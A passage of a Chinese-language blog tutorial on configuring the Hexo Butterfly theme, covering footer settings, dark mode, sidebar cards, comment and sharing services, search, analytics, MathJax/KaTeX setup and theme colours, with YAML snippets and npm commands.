title="Footer设置"></a>Footer设置</h2><h3 id="博客年份"><a href="#博客年份" class="headerlink" title="博客年份"></a>博客年份</h3><p><code>since</code>是一个来展示你站点起始时间的选项，它位于页面的最底部。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">since:</span> <span class="number">2018</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/since.png" class="lazyload"></p><h3 id="脚本页自定义文本"><a href="#脚本页自定义文本" class="headerlink" title="脚本页自定义文本"></a>脚本页自定义文本</h3><p><code>Footer_custom_text</code>是一个给你用来在页脚自定义文本的选项，通常你可以在这里写声明文本等。支持HTML。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer_custom_text:</span> <span class="string">Hi,welcome</span> <span class="string">to</span> <span class="string">my</span> <span class="string">&lt;a</span> <span class="string">href="yhttps://c-hasel.github.io/"&gt;blog&lt;/a&gt;!</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/footer.png" class="lazyload"></p><h3 id="ICP"><a href="#ICP" class="headerlink" title="ICP"></a>ICP</h3><p>对于部分有备案的域名，可以在ICP配置显示  </p><p>配置<code>butterfly</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ICP:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://www.beian.miit.gov.cn/state/outPortal/loginPortal.action</span></span><br><span class="line">  <span class="attr">text:</span> <span class="string">渝ICP备xxx</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">/img/icp.png</span></span><br></pre></td></tr></table></figure><h2 id="右下角按钮"><a href="#右下角按钮" class="headerlink" title="右下角按钮"></a>右下角按钮</h2><h3 id="简繁转换"><a href="#简繁转换" class="headerlink" title="简繁转换"></a>简繁转换</h3><p>简体繁体互换  </p><p>右下角会有简繁转换按钮。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">translate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># 默认按钮显示文字(网站是简体，应设置为'default: 繁')</span></span><br><span class="line">  <span class="attr">default:</span> <span class="string">简</span></span><br><span class="line">  <span class="comment">#网站默认语言，1: 繁体中文, 2: 简体中文</span></span><br><span class="line">  <span class="attr">defaultEncoding:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment">#延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0</span></span><br><span class="line">  <span class="attr">translateDelay:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment">#博客网址</span></span><br><span class="line">  <span class="attr">cookieDomain:</span> <span class="string">"https://jerryc.me/"</span></span><br><span class="line">  <span class="comment">#当文字是简体时，按钮显示的文字</span></span><br><span class="line">  <span class="attr">msgToTraditionalChinese:</span> <span class="string">"繁"</span></span><br><span class="line">  <span class="comment">#当文字是繁体时，按钮显示的文字</span></span><br><span class="line">  <span class="attr">msgToSimplifiedChinese:</span> <span class="string">"简"</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>简体</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-simp.png" class="lazyload"></p><div class="note info no-icon">            <p>繁体</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-tranditional.png" class="lazyload"></p><h3 id="夜间模式"><a href="#夜间模式" class="headerlink" title="夜间模式"></a>夜间模式</h3><p>右下角会有夜间模式按钮  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#夜间模式</span></span><br><span class="line"><span class="attr">darkmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/night.png" class="lazyload"></p><div class="note info no-icon">            <p>V2.0.0开始增加一个选项，可开启自动切换light mode和dark mode  </p><p>autoChangeMode: 1 跟随系统二变化，不支持浏览器/系统将按照时间晚上6点到早上6点之间切换为dark mode  </p><p>autoChangeMode: 2 只按照时间晚上6点到早上6点之间切换为dark mode，其余时间为light mode  </p><p>autoChangeMode: false 取消自动切换</p>          </div><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动切换dark mode和light mode</span></span><br><span class="line"><span class="attr">autoChangeMode:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="阅读模式"><a href="#阅读模式" class="headerlink" title="阅读模式"></a>阅读模式</h3><p>阅读模式下会去掉除文章外的内容，避免干扰阅读。  </p><p>只会出现在文章页面，右下角会有阅读模式按钮  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">readmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-read-mode.png" class="lazyload"></p><h2 id="侧边栏设置"><a href="#侧边栏设置" class="headerlink" title="侧边栏设置"></a>侧边栏设置</h2><h3 id="侧边排版"><a href="#侧边排版" class="headerlink" title="侧边排版"></a>侧边排版</h3><p>可自行决定哪个项目需要显示，可决定位置。</p><div class="note info no-icon">            <p>至少需要显示一个</p>          </div><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span> <span class="comment"># left or right</span></span><br><span class="line">  <span class="attr">card_author:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_announcement:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_recent_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_categories:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_tags:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_archives:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_webinfo:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>left</strong><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/left.png" class="lazyload"><br><strong>right</strong><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/right.png" class="lazyload"></p><h3 id="访问人数busuanzi-UV和PV"><a href="#访问人数busuanzi-UV和PV" class="headerlink" title="访问人数busuanzi(UV和PV)"></a>访问人数busuanzi(UV和PV)</h3><p>访问busuanzi的<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">官方网站</a>查看更多介绍。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-busuanzi-site-pv.png" class="lazyload"><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-pv.png" class="lazyload"></p><h3 id="运行时间"><a href="#运行时间" class="headerlink" title="运行时间"></a>运行时间</h3><p>网页已运行时间  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runtimeshow:</span><br><span class="line">  enable: true</span><br><span class="line">  start_date: 12/1/2019 00:00:00</span><br><span class="line">  ##网页开通时间</span><br><span class="line">  #格式: 月/日/年 时间</span><br><span class="line">  #也可写成 年/月/日 时间</span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-runtime.png" class="lazyload"></p><h2 id="Note-Bootstrap-Callout"><a href="#Note-Bootstrap-Callout" class="headerlink" title="Note(Bootstrap Callout)"></a>Note(Bootstrap Callout)</h2><p>移植于next主题(注意，书写不是markdown规范，而是hexo特有的工呢，故在其它地方不会显示出效果)</p><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">note:</span></span><br><span class="line">  <span class="comment"># Note tag style values:</span></span><br><span class="line">  <span class="comment">#  - simple    bs-callout old alert style. Default.</span></span><br><span class="line">  <span class="comment">#  - modern    bs-callout new (v2-v3) alert style.</span></span><br><span class="line">  <span class="comment">#  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span></span><br><span class="line">  <span class="comment">#  - disabled  disable all CSS styles import of note tag.</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">simple</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">border_radius:</span> <span class="number">3</span></span><br><span class="line">  <span class="comment"># Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line">  <span class="comment"># Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line">  <span class="attr">light_bg_offset:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note [class] [no-icon] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">[class]   : default | primary | success | info | warning | danger.</span><br><span class="line">[no-icon] : Disable icon in note.</span><br><span class="line"></span><br><span class="line">All parameters are optional.</span><br></pre></td></tr></table></figure><p>具体效果、用法可查看<a href="https://theme-next.org/docs/tag-plugins/note" target="_blank" rel="noopener">这里</a></p><h2 id="Gallery相册"><a href="#Gallery相册" class="headerlink" title="Gallery相册"></a>Gallery相册</h2><div class="note info no-icon">            <p>2.0.0以上提供</p>          </div><p>区别于旧版的Gallery相册，新的Gallery相册会自动根据图片长度进行排版，书写也更方便，与markdown格式一样。可根据需要插入到对应的md。  </p><p>写法：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 图片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><div class="note info no-icon">            <p>只能选择一个评论服务商</p>          </div><h3 id="Disqus"><a href="#Disqus" class="headerlink" title="Disqus"></a>Disqus</h3><p>注册<a href="https://disqus.com/" target="_blank" rel="noopener">disqus</a>配置你的disqus，然后在<code>Butterfly</code>里开启它。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">disqus:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># or fasle</span></span><br><span class="line">  <span class="attr">shortname:</span> <span class="string">你的disqus的</span> <span class="string">short-name</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-disqus.png" class="lazyload"></p><h3 id="Laibili-来必力"><a href="#Laibili-来必力" class="headerlink" title="Laibili(来必力)"></a>Laibili(来必力)</h3><p>注册<a href="http://www.laibili.com.cn/" target="_blank" rel="noopener">来必力</a>配置你自己的来必力设置，然后在<code>butterfly</code>里开启它。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">laibili:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># or false</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">你的laibili的uid</span></span><br></pre></td></tr></table></figure><p>laibili的uid你能在这里找到:<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-laibili.jpg" class="lazyload"><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-laibili_2.png" class="lazyload"></p><h3 id="Gitalk"><a href="#Gitalk" class="headerlink" title="Gitalk"></a>Gitalk</h3><p>遵循<a href="https://github.com/gitalk/gitalk" target="_blank" rel="noopener">gitalk</a>的指示去获取你的github Oauth应用的client id和secret值。以及查看他的相关配置说明。  </p><p>然后配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="string">你的client</span> <span class="string">id</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">你的client</span> <span class="string">secret</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">你的github仓库</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">你的github用户名</span></span><br><span class="line">  <span class="attr">admin:</span> <span class="string">该仓库的拥有者或协作者</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-gitalk.png" class="lazyload"></p><h3 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a>Valine</h3><p>遵循<a href="https://github.com/xCss/Valine" target="_blank" rel="noopener">Valine</a>的指示去配置你的LeanCloud应用。以及查看相应的配置说明。  </p><p>然后配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span> <span class="comment"># if you want use valine,please set this value is true</span></span><br><span class="line">  <span class="attr">appId:</span>   <span class="comment"># leancloud application app id</span></span><br><span class="line">  <span class="attr">appKey:</span>   <span class="comment"># leancloud application app key</span></span><br><span class="line">  <span class="attr">notify:</span> <span class="literal">false</span> <span class="comment"># valine mail notify (true/false) https://github.com/xCss/Valine/wiki</span></span><br><span class="line">  <span class="attr">verify:</span> <span class="literal">false</span> <span class="comment"># valine verify code (true/false)</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># comment list page size</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">monsterid</span> <span class="comment"># gravatar style https://valine.js.org/#/avatar</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">en</span> <span class="comment"># i18n: zh-cn/en/tw</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">Please</span> <span class="string">leave</span> <span class="string">your</span> <span class="string">footprints</span> <span class="comment"># valine comment input placeholder(like: Please leave your footprints )</span></span><br><span class="line">  <span class="attr">guest_info:</span> <span class="string">nick,mail,link</span> <span class="comment">#valine comment header inf</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-valine.png" class="lazyload"></p><h2 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h2><div class="note info no-icon">            <p>只能选择一个分享服务商</p>          </div><h3 id="AddThis"><a href="#AddThis" class="headerlink" title="AddThis"></a>AddThis</h3><div class="note info no-icon">            <p>找到你的pub-id</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-addthis.jpg" class="lazyload"><br>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">addThis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># or false</span></span><br><span class="line">  <span class="attr">pubid:</span> <span class="string">你的pub-id</span></span><br></pre></td></tr></table></figure><h3 id="Sharejs"><a href="#Sharejs" class="headerlink" title="Sharejs"></a>Sharejs</h3><p>如果你不知道<a href="https://github.com/overtrue/share.js/" target="_blank" rel="noopener">sharejs</a>，看看它的说明。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sharejs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">sites:</span> <span class="string">facebook,twitter,wechat,weibo,qq</span> <span class="comment">#想要显示的内容</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-sharejs.png" class="lazyload"></p><h3 id="Addtoany"><a href="#Addtoany" class="headerlink" title="Addtoany"></a>Addtoany</h3><p>可以找到<a href="https://www.addtoany.com/" target="_blank" rel="noopener">addtoany</a>查看使用说明</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">addtoany:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">item:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">facebook</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">twitter</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">wechat</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sina_weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">facebook_messenger</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">email</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">copy_link</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-addtoany.png" class="lazyload"></p><h2 id="搜索系统"><a href="#搜索系统" class="headerlink" title="搜索系统"></a>搜索系统</h2><h3 id="Algolia"><a href="#Algolia" class="headerlink" title="Algolia"></a>Algolia</h3><ol><li>你需要安装<a href="https://github.com/oncletom/hexo-algolia" target="_blank" rel="noopener">hexo-algolia</a>或者<a href="https://github.com/LouisBarranqueiro/hexo-algoliasearch" target="_blank" rel="noopener">hexo-algoliasearch</a>，根据它们的说明文档去做相应的配置。</li><li>配置<code>butterfly.yml</code></li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">algolia_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hits:</span></span><br><span class="line">    <span class="attr">per_page:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line">    <span class="attr">hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span> <span class="comment"># if there are no result</span></span><br><span class="line">    <span class="attr">hits_stats:</span> <span class="string">"$&#123;hits&#125; results found in $&#123;time&#125; ms"</span></span><br></pre></td></tr></table></figure><h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><ol><li>你需要安装<a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a>，根据它的文档去做相应的配置。<strong>注意格式只支持xml</strong></li><li>配置<code>butterfly.yml</code></li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line">    <span class="attr">hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span> <span class="comment"># if there are no result</span></span><br></pre></td></tr></table></figure><h2 id="网站验证"><a href="#网站验证" class="headerlink" title="网站验证"></a>网站验证</h2><p>如果你需要搜索引擎收录你的网站，可能需要登录对应搜索引擎的管理平台进行提交。<br>各自的验证码可从各自管理平台拿到  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Google Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://www.google.com/webmasters/</span></span><br><span class="line"><span class="attr">google_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bing Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://www.bing.com/webmaster/</span></span><br><span class="line"><span class="attr">bing_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Yandex Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://webmaster.yandex.ru/</span></span><br><span class="line"><span class="attr">yandex_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://ziyuan.baidu.com/site/</span></span><br><span class="line"><span class="attr">baidu_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 360 Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># see http://zhanzhang.so.com/</span></span><br><span class="line"><span class="attr">qihu_site_verification:</span></span><br></pre></td></tr></table></figure><h2 id="分析统计"><a href="#分析统计" class="headerlink" title="分析统计"></a>分析统计</h2><h3 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h3><ol><li>登录百度统计的<a href="https://tongji.baidu.com/web/welcome/login" target="_blank" rel="noopener">官方网站</a></li><li>找到你百度统计的统计代码<br>！<a href="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-baidu-tongji.jpg" target="_blank" rel="noopener"></a></li><li>配置<code>butterfly.yml</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu_analytics: 你的代码 #只复制打码部分</span><br></pre></td></tr></table></figure></li></ol><h3 id="谷歌统计"><a href="#谷歌统计" class="headerlink" title="谷歌统计"></a>谷歌统计</h3><ol><li>登录谷歌分析的<a href="https://www.google.com/analytics/" target="_blank" rel="noopener">官方网站</a></li><li>找到你的谷歌分析的追踪ID<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-google-analytics.jpg" class="lazyload"></li><li>配置<code>butterfly.yml</code></li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">google_analytics:</span> <span class="string">你的代码</span> <span class="comment"># 通常以'UA_'打头</span></span><br></pre></td></tr></table></figure><h2 id="Mathjax"><a href="#Mathjax" class="headerlink" title="Mathjax"></a>Mathjax</h2><div class="note info no-icon">            <p>建议使用KaTex获得更好的效果，下文有介绍!</p>          </div><p>配置<code>butterfly.yml</code>:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># or false</span></span><br><span class="line">  <span class="attr">cdn:</span> <span class="string">https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span> <span class="comment"># required</span></span><br></pre></td></tr></table></figure><p>然后你需要修改一下默认的<code>markdown</code>渲染引擎来实现MathJax的效果。  </p><p>查看:<a href="https://www.npmjs.com/package/hexo-renderer-kramed" target="_blank" rel="noopener">hexo-renderer-kramed</a>  </p><p>以下操作在你hexo博客的目录下(<strong>不是Butterfly的目录!</strong>):<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-mathjax.png" class="lazyload"><br>效果:<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-mathjax-2.jpg" class="lazyload"></p><h2 id="KaTex"><a href="#KaTex" class="headerlink" title="KaTex"></a>KaTex</h2><p>首先禁用<code>MathJax</code>(如果你配置过MathJax的话)，然后修改你的<code>butterfly.yml</code>以便加载<code>katex.min.css</code>:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">katex:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">cdn:</span> </span><br><span class="line">    <span class="attr">css:</span> <span class="string">https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css</span></span><br></pre></td></tr></table></figure><p>你不需要添加<code>katex.min.js</code>来渲染数学方程。相应的你需要卸载你之前的hexo的markdown渲染器以及<code>hexo-math</code>，然后安装新的<code>hexo-renderer-markdown-it-plus</code>:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换 `hexo-renderer-kramed` 或者 `hexo-renderer-marked` 等hexo的markdown渲染器</span></span><br><span class="line"><span class="comment"># 你可以在你的package.json里找到hexo的markdwon渲染器，并将其卸载</span></span><br><span class="line"><span class="string">npm</span> <span class="string">un</span> <span class="string">hexo-renderer-marked</span> <span class="string">--save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"></span><br><span class="line"><span class="string">npm</span> <span class="string">un</span> <span class="string">hexo-renderer-kramed</span> <span class="string">--save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 `hexo-math`</span></span><br><span class="line"><span class="string">npm</span> <span class="string">un</span> <span class="string">hexo-math</span> <span class="string">--save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后安装 `hexo-renderer-markdown-it-plus`</span></span><br><span class="line"><span class="string">npm</span> <span class="string">i</span> <span class="string">@upupming/hexo-renderer-markdown-it-plus</span> <span class="string">--save</span></span><br></pre></td></tr></table></figure><p>注意到<code>hexo-renderer-markdown-it-plus</code>已经无人持续维护，所以我们使用<code>@upupming/hexo-renderer-markdown-it-plus</code>。这份fork的代码使用了<code>@neilsustc/markdown-it-katex</code>同时它也是VSCode的插件<a href="https://github.com/yzhang-gh/vscode-markdown" target="_blank" rel="noopener">Markdown All in One</a>所使用的，所以我们可以获得最新的KaTex功能例如<code>\tag{}</code>。  </p><p>你还可以通过<code>@neilsustc/markdown-it0katex</code>控制KaTex的设置，所有可配置的选项参见<a href="https://katex.org/docs/options.html" target="_blank" rel="noopener">https://katex.org/docs/options.html</a>。比如你想要禁用掉KaTex在命令行上输出的宂长的警告信息，你可以在根目录的<code>_config.yml</code>中使用下面的配置将<code>strict</code>设置为flase:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">markdown_it_plus:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">plugin:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">'@neilsustc/markdown-it-katex'</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">strict:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>当然，你还可以利用这个特征性来定义一些自己常用的额<code>macros</code>.  </p><p>因为KaTex更快更轻量，因此没有MathJax的功能多(比如右键菜单)。为那些使用MathJax的用户，我们也为KaTex默认添加了<a href="https://github.com/upupming/katex-copytex" target="_blank" rel="noopener">Copy As TeX Code</a>的功能。<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-katex.gif" class="lazyload"></p><h2 id="美化-特效"><a href="#美化-特效" class="headerlink" title="美化/特效"></a>美化/特效</h2><h3 id="自定义主题色"><a href="#自定义主题色" class="headerlink" title="自定义主题色"></a>自定义主题色</h3><p>可以修改大部分UI颜色  </p><p>配置<code>butterfly.yml</code>，比如:</p><div class="note info no-icon">            <p>颜色值必须被双引号包裹，就像<code>&quot;#000&quot;</code>而不是<code>#000</code>。否则将会在构建的时候报错！</p>          </div><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">"#9370DB"</span></span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">"#7A7FF1"</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">"#FF7242"</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">"#69c46d"</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">"#858585"</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">"#A4D8FA"</span></span><br><span class="line">  <span class="attr">read-mode-bg_color:</span> <span class="string">'#FAF9DE'</span></span><br></pre></td></tr></table></figure><h3 id="网站背景"><a href="#网站背景" class="headerlink" title="网站背景"></a>网站背景</h3><p>默认显示白色，可设置图片或颜色  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 图片格式 background: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="comment"># 顔色 background: '#49B202'</span></span><br><span class="line"><span class="comment"># 留空 显示白色</span></span><br><span class="line"><span class="attr">background:</span></span><br></pre></td></tr></table></figure><h3 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h3><p>footer的背景会与<code>top_img</code>的一致，当设置<code>flase</code>时，将与主题颜色一致。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># footer是否显示图片背景(与top_img一致)</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span 